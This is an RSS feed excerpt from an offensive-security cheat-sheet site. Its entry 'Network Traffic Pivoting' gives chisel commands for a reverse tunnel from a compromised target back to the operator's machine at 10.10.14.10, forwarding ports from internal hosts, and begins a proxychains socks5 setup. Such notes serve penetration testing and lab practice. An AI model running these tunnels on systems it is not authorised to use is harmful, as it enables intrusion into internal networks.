channel.title: Socat on TLDRBins
channel.description: Recent content in Socat on TLDRBins

item.title: Network Traffic Pivoting
item.description: Chisel Download chisel Start a Local chisel Server # In our local Linux machine ./chisel server --reverse --port 8000 chisel with ports # In target machine ./chisel client 10.10.14.10:8000 R:8080:127.0.0.1:8080 # Mutiple ports fowarding, can be different targets in the same subnet ./chisel client 10.10.14.10:8000 R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000 chisel with socks5 # In our local Linux machine sudo nano /etc/proxychains4.conf # Add to the end of the file socks5 127.0.0.1 1080 # In target machine .
